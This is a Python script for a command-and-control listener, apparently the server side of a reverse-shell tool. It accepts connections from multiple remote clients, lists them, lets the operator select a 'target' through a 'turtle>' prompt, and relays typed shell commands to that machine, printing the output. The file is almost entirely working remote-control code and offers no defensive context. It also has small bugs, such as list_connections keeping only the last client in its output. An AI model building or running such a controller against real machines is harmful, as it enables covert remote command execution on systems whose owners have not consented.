import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# Create a Socket
def create_socket():
    try:
        global host
        global port
        global s
        host = 'localhost' # or str(socket.gethostbyname(socket.gethostname()))
        port = 1234
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted
def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# Second thread functions

# Interactive prompt for sending commands
def start_turtle():

    while True:
        cmd = input('turtle> ')
        if str(cmd).lower() == 'list' or str(cmd).lower() == 'l':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized!")


# Display all current active connections with client
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = "Client ID: " + str(i) + " | IP: " + str(all_address[i][0]) + " | Port: " + str(all_address[i][1]) + "\n"

    print("Active Clients:" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + "> ", end="")
        return conn

    except:
        print("Selection not valid!")
        return None


# Send commands to client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if str(cmd).lower() == 'quit' or str(cmd).lower() == 'q':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        job = queue.get()
        if job == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if job == 2:
            start_turtle()

        queue.task_done()

# Create jobs
def create_jobs():
    for job in JOB_NUMBER:
        queue.put(job)

    queue.join()

# Initiate the script
create_workers()
create_jobs()
